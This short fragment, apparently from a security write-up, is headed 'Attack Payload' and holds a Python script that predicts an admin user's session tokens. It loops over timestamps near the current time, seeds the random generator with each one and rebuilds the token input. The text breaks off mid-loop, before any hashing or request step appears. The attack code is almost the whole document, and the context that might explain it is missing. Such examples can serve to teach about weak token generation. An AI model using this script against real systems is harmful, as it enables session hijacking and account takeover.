**Attack Payload**:
```python
import hashlib
import time
import random
import requests

# Attacker script to predict session tokens
target_user = "admin"
base_timestamp = int(time.time())

# Try timestamps within a reasonable window
for ts_offset in range(-60, 60):
    timestamp = base_timestamp + ts_offset
    random.seed(timestamp)
    random_part = random.randint(0, 9999)

    data = f"{target_user}-{timestamp}-{random_part}"
